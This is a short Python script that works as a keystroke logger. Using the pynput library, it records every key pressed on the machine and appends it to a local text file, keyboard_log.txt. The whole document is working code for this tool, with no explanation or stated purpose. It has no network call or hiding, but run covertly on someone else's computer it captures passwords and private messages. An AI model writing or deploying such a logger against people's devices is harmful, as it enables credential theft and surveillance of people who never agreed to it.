from pynput.keyboard import Listener

def writeToFile(key):
    keydata=str(key).replace("'","")
    with open("keyboard_log.txt","a") as f:
        f.write(keydata+"\n")

def start_keyboard_logger():
    with Listener(on_press=writeToFile) as listener:
        listener.join()

if __name__=="__main__":
    start_keyboard_logger()
